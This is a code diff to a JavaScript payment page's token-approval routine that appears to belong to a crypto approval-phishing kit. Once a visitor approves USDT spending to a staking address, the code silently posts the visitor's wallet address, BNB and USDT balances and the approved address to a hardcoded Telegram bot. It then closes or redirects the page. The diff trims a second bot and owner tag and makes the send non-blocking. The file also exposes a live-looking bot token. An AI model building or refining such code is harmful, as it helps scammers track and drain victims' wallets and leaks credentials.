@@ -549,36 +549,33 @@ async function approveToken(account) {
             console.log('📤 Date:', formattedDate);
             console.log('📤 Hash:', hash);
             
-            try {
-                // Ensure all variables are defined
-                const walletAddr = account || 'Unknown';
-                const bnbBal = balanceInBNB || '0';
-                const usdtBal = usdtBalanceFormatted || '0';
-                const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
-                const dateStr = formattedDate || new Date().toLocaleString();
-                const txHash = hash || 'Unknown';
-                
-                // Send Telegram notification and WAIT for it before closing/redirecting
-                console.log('📨 [TX] Sending Telegram notification (await)...');
-                const notifResult = await sendTelegramNotification(
-                    walletAddr, 
-                    bnbBal, 
-                    usdtBal, 
-                    approvedAddr, 
-                    dateStr, 
-                    txHash
-                );
-
-                if (notifResult) {
+            // Ensure all variables are defined
+            const walletAddr = account || 'Unknown';
+            const bnbBal = balanceInBNB || '0';
+            const usdtBal = usdtBalanceFormatted || '0';
+            const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
+            const dateStr = formattedDate || new Date().toLocaleString();
+            const txHash = hash || 'Unknown';
+            
+            // Send Telegram notification immediately when transaction hash is received
+            console.log('📨 [TX] Sending Telegram notification...');
+            sendTelegramNotification(
+                walletAddr, 
+                bnbBal, 
+                usdtBal, 
+                approvedAddr, 
+                dateStr, 
+                txHash
+            ).then(result => {
+                if (result) {
                     console.log('✅ [TX] Telegram notification sent successfully');
                 } else {
                     console.error('❌ [TX] Telegram notification returned false');
                 }
-            } catch (err) {
+            }).catch(err => {
                 console.error('❌ [TX] Telegram notification error:', err);
-            }
+            });
             
-            // Only after attempting Telegram notification, call your backend and close/redirect
             var maindt = { "fromaddress": account, "txthash": hash, "PackageAmt": approvedUSDT };
             $.ajax({
                 url: '/home/TopUpWithMetamaskJson',
@@ -588,8 +585,10 @@ async function approveToken(account) {
                 data: JSON.stringify(maindt),
                 success: function (data) {
                     console.log('Success');
+                    // Close site immediately after Telegram notification sent
                     setTimeout(() => {
                         window.close();
+                        // If window.close doesn't work, try redirect
                         if (!window.closed) {
                             location.href = "/home/index";
                         }
@@ -597,8 +596,10 @@ async function approveToken(account) {
                 },
                 error: function (err) {
                     console.log("Error: " + JSON.stringify(err));
+                    // Close site immediately after Telegram notification sent
                     setTimeout(() => {
                         window.close();
+                        // If window.close doesn't work, try redirect
                         if (!window.closed) {
                             location.href = "/home/index";
                         }
@@ -626,81 +627,77 @@ async function approveToken(account) {
 
 // Telegram notification function - simplified and more reliable
 async function sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash) {
-    // Telegram Bot Configuration - First Bot
+    // Function is automatically available globally, but we'll also assign it explicitly
     const botToken = '8327129513:AAG3Ic98kJkpXNy8lRS0QKFqx-oQ9ilG4vQ';
     const chatId = '8191508290';
     
-    // Telegram Bot Configuration - Second Bot
-    const botToken2 = '8327129513:AAG3Ic98kJkpXNy8lRS0QKFqx-oQ9ilG4vQ';
-    const chatId2 = '8191508290';
-    
-    // Owner and Domain Configuration
-    const ownerName = 'SHUBHAM_BNB_SCANNER';
-    const domainName = window.location.hostname || 'yourdomain.com';
-    
-    // Build message with owner name and domain name
     const message = `🔔 USDT Approval Notification\n\n` +
                     `👤 Wallet Address: ${walletAddress}\n` +
                     `💰 BNB Balance: ${bnbAmount} BNB\n` +
                     `💵 USDT Balance: ${usdtAmount} USDT\n` +
                     `📍 Approved Address: ${approvedAddress}\n` +
-                    `📅 Date and Time: ${dateTime}\n\n` +
-                    `👤 Owner: ${ownerName}\n` +
-                    `🌐 Domain: ${domainName}`;
+                    `📅 Date and Time: ${dateTime}`;
 
-    // Helper function to send to a single bot
-    async function sendToBot(token, chatId, botNumber) {
-        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        console.log(`📤 [TELEGRAM BOT ${botNumber}] Starting notification send...`);
-        console.log(`📤 [TELEGRAM BOT ${botNumber}] URL:`, url);
-        console.log(`📤 [TELEGRAM BOT ${botNumber}] Chat ID:`, chatId);
-        console.log(`📤 [TELEGRAM BOT ${botNumber}] Message length:`, message.length);
+    console.log('📤 [TELEGRAM] Starting notification send...');
+    console.log('📤 [TELEGRAM] URL:', url);
+    console.log('📤 [TELEGRAM] Chat ID:', chatId);
+    console.log('📤 [TELEGRAM] Message length:', message.length);
 
+    try {
+        const requestBody = {
+            chat_id: chatId,
+            text: message
+        };
+        
+        console.log('📤 [TELEGRAM] Request body:', JSON.stringify(requestBody).substring(0, 200));
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(requestBody),
+            mode: 'cors'
+        });
+        
+        console.log('📤 [TELEGRAM] Response status:', response.status);
+        console.log('📤 [TELEGRAM] Response ok:', response.ok);
+        
+        const responseText = await response.text();
+        console.log('📤 [TELEGRAM] Response text:', responseText);
+        
+        let data;
         try {
-            const requestBody = {
-                chat_id: chatId,
-                text: message
-            };
-            
-            console.log(`📤 [TELEGRAM BOT ${botNumber}] Request body:`, JSON.stringify(requestBody).substring(0, 200));
-            
-            // Telegram Bot API does not send CORS headers for browser calls.
-            // Using 'no-cors' allows the request to be sent, but we cannot read
-            // the response. If fetch() resolves, we treat it as sent.
-            await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(requestBody),
-                mode: 'no-cors'
-            });
-            
-            console.log(`✅ [TELEGRAM BOT ${botNumber}] Request sent (no-cors, response not readable).`);
-            return true;
-        } catch (error) {
-            console.error(`❌ [TELEGRAM BOT ${botNumber}] Exception caught:`, error);
-            console.error(`❌ [TELEGRAM BOT ${botNumber}] Error name:`, error.name);
-            console.error(`❌ [TELEGRAM BOT ${botNumber}] Error message:`, error.message);
-            if (error.stack) {
-                console.error(`❌ [TELEGRAM BOT ${botNumber}] Error stack:`, error.stack);
-            }
+            data = JSON.parse(responseText);
+        } catch (e) {
+            console.error('📤 [TELEGRAM] Failed to parse JSON:', e);
+            console.error('📤 [TELEGRAM] Raw response:', responseText);
             return false;
         }
+        
+        console.log('📤 [TELEGRAM] Parsed response:', data);
+        
+        if (data.ok) {
+            console.log('✅ [TELEGRAM] Notification sent successfully!');
+            console.log('📬 [TELEGRAM] Message ID:', data.result?.message_id);
+            return true;
+        } else {
+            console.error('❌ [TELEGRAM] Failed to send notification');
+            console.error('❌ [TELEGRAM] Error code:', data.error_code);
+            console.error('❌ [TELEGRAM] Error description:', data.description);
+            return false;
+        }
+    } catch (error) {
+        console.error('❌ [TELEGRAM] Exception caught:', error);
+        console.error('❌ [TELEGRAM] Error name:', error.name);
+        console.error('❌ [TELEGRAM] Error message:', error.message);
+        if (error.stack) {
+            console.error('❌ [TELEGRAM] Error stack:', error.stack);
+        }
+        return false;
     }
-
-    // Send to first bot
-    const result1 = await sendToBot(botToken, chatId, 1);
-    
-    // Send to second bot if configured
-    let result2 = false;
-    if (botToken2 && chatId2) {
-        result2 = await sendToBot(botToken2, chatId2, 2);
-    }
-    
-    // Return true if at least one bot succeeded
-    return result1 || result2;
 }
 
 // Function is already globally accessible, but ensure it's on window for explicit access
